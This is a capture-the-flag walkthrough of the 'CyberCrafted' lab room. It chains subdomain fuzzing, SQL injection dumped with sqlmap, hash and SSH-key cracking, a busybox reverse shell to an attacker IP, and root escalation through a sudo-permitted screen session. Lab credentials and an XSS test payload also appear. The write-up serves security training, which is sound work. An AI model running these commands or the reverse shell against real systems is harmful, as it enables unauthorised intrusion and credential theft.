# Room: CyberCrafted

Difficulty: Medium

Task: Pwn this pay-to-win Minecraft server!

## Reconnaissance
I began scanning the network using nmap -sC -sV -p- <TARGET_IP>

Result:
``` bash
PORT      STATE SERVICE   VERSION
22/tcp    open  ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:36:ce:b9:ac:72:8a:d7:a6:b7:8e:45:d0:ce:3c:00 (RSA)
|   256 e9:e7:33:8a:77:28:2c:d4:8c:6d:8a:2c:e7:88:95:30 (ECDSA)
|_  256 76:a2:b1:cf:1b:3d:ce:6c:60:f5:63:24:3e:ef:70:d8 (ED25519)
80/tcp    open  http      Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Did not follow redirect to http://cybercrafted.thm/
|_http-server-header: Apache/2.4.29 (Ubuntu)
25565/tcp open  minecraft Minecraft 1.7.2 (Protocol: 127, Message: ck00r lcCyberCraftedr ck00rrck00r e-TryHackMe-r  ck00r, Users: 0/1)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- Q1: How many ports are open?
- A1: 3
- Q2: What service runs on the highest port?
- A2: Minecraft

I added cybercrafted.thm to my /etc/hosts so I could visit it. Upon visiting, there was nothing suspicious until I checked the source page and found a comment:

“A Note to the developers: Just finished up adding other subdomains, now you can work on them!”

So I started fuzzing for subdomains using ffuf:
``` bash
ffuf -u http://cybercrafted.thm/ -H "Host: FUZZ.cybercrafted.thm" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs 0
```
Result:
``` bash
admin [200]
store [403]
www [200]
```
Q3: Any subdomains? (Alphabetical order)

A3: admin, store, www

## Initial Access & SQL Injection
Upon investigation, I found that the parameter was suspicious: 
```
http://admin.cybercrafted.thm/?error=Username%20is%20required
```
I sent an XSS payload:
Payload:
``` bash
?error=<script>alert(1);</script>
```
It worked! The application was taking user input (error parameter) and injecting it into the HTML page without proper sanitization or escaping.

I spent some time here, but it was a rabbit hole, so I enumerated again and found the page search.php on the store subdomain.

- Q4: On what page did you find the vulnerability?

- A4: search.php

Upon visiting, there was a search bar which retrieved items from the database. I captured the request using Burp Suite and confirmed it was vulnerable to SQL Injection.

Sqlmap:
``` bash
sqlmap -r cybercrafted --dbs
sqlmap -r cybercrafted -D webapp --tables
sqlmap -r cybercrafted -D webapp -T admin --columns
sqlmap -r cybercrafted -D webapp -T admin -C user,hash --dump
```
Result:
``` bash
+------------------------------------------+---------------------+
| hash                                     | user                |
+------------------------------------------+---------------------+
| 88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01 | xXUltimateCreeperXx |
| THM{<REDACTED>}    | web_flag            |
+------------------------------------------+---------------------+
```
Q4: What is the web flag?

A4:<REDACTED>

## Exploitation & Privilege Escalation
Cracking the hash was easy because hashid identified it as SHA1. I used an online tool to decrypt it.
``` 
Cracked Value: diamond123456789
```
I logged in as xXUltimateCreeperXx:diamond123456789 and was redirected to panel.php, which allows for executing system commands. I set up my listener on port 4444 and executed a reverse shell using busybox:
``` bash
busybox nc YOUR_IP 4444 -e bash
```
I gained access as www-data. I transferred linpeas to the target machine, which found xxultimatecreeperxx’s id_rsa at /home/xxultimatecreeperxx/.ssh/id_rsa. I cracked it using John the Ripper:
``` bash
ssh2john id_rsa > john_id.hash
john --wordlist=/usr/share/wordlists/rockyou.txt john_id.hash --rules=none
```
- Cracked: creepin2006

I successfully connected via SSH and found the Minecraft server’s flag at 
``` bash
/opt/minecraft/minecraft_server_flag.txt.
```
- Q5: Can you get the Minecraft server flag?

- A5:<REDACTED>

Inside Note.txt, I found a hint about a new plugin. I checked the plugins at 
```
/opt/minecraft/cybercrafted/plugins/
```
and found LoginSystem. Inside log.txt, I found cybercrafted’s password:
``` bash
[2021/06/27 11:25:16] cybercrafted registered. PW: JavaEdition>Bedrock
```
Using these credentials, I grabbed the user flag at /home/cybercrafted/user.txt.

- Q6: What is the user's flag?

- A6:<REDACTED>

## Root Escalation
I ran sudo -l and found:
``` bash
User cybercrafted may run the following commands on cybercrafted:
    (root) /usr/bin/screen -r cybercrafted
```
To exploit this, I ran:
``` bash
sudo /usr/bin/screen -r cybercrafted
```
Inside screen:
``` bash
Ctrl+a, c
```
Now I am root

## Explanation:

This attached me to a screen session running as root. I obtained a root shell by creating a new window with the shortcut Ctrl+a, c. Since root owned the original process, the new window also ran with root privileges. I then obtained the final flag at /root/root.txt.

## Attack Chain

The attack began with an Nmap scan identifying SSH, a web server (Apache), and a Minecraft server (v1.7.2). Subdomain fuzzing revealed admin, store, and www subdomains. While admin featured an XSS vulnerability, it was a rabbit hole; the primary entry point was found in the store subdomain via a SQL injection vulnerability in search.php. Using sqlmap, the webapp database was dumped, yielding a SHA1 hash for the user xXUltimateCreeperXx. Once cracked (diamond123456789), the credentials provided access to an administrative panel with system command execution capabilities, which was leveraged to spawn a busybox reverse shell as the www-data user.

Internal enumeration using linpeas discovered an encrypted SSH private key in xxultimatecreeperxx's home directory. The passphrase was cracked using John the Ripper, allowing SSH access as the user. Further investigation of the Minecraft server files in /opt/minecraft/ led to a plugin log (log.txt) containing the cleartext password for the user cybercrafted. After pivoting to the cybercrafted account, sudo -l revealed permissions to resume a root-owned screen session. By attaching to the session and using the screen window creation shortcut (Ctrl+a, c), a new shell was spawned that inherited root privileges, allowing for the retrieval of the final flag.

## Attack Flowchart
```
[ Nmap Recon ]
|
v
Open Ports Discovered
(22 SSH / 80 HTTP / 25565 Minecraft)
|
v
[ Subdomain Fuzzing (ffuf) ]
(admin. / store. / www.cybercrafted.thm)
|
v
Vulnerability Identified:
SQL Injection in store.cybercrafted.thm/search.php
|
v
[ sqlmap Enumeration ]
|
v
Database Dump (webapp.admin)
|
v
Extracted SHA1 Hash:
88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01
|
v
[ Hash Cracking (Online/Hashcat) ]
Result: diamond123456789
|
v
Admin Panel Access (panel.php)
|
v
Command Injection via Panel
|
v
[ Busybox Reverse Shell ]
Initial Access (user: www-data)
|
v
Internal Enumeration (linpeas)
|
v
[ Found id_rsa ]
(/home/xxultimatecreeperxx/.ssh/id_rsa)
|
v
SSH Key Cracking (John the Ripper)
Passphrase: creepin2006
|
v
SSH Login (user: xxultimatecreeperxx)
|
v
Minecraft Plugin Enumeration:
/opt/minecraft/cybercrafted/plugins/LoginSystem/log.txt
|
v
[ Found Cleartext Credentials ]
cybercrafted : JavaEdition>Bedrock
|
v
Horizontal Pivot (su cybercrafted)
|
v
Sudo Enumeration (sudo -l)
/usr/bin/screen -r cybercrafted
|
v
[ Screen Session Hijacking ]
Attach to root session
|
v
Screen Escape Shortcut:
Ctrl+a, c (Create New Window)
|
v
New Window Spawned as Root
|
v
Read Sensitive File:
/root/root.txt
|
v
[ ROOT COMPROMISE / FLAG ACCESS ]
```
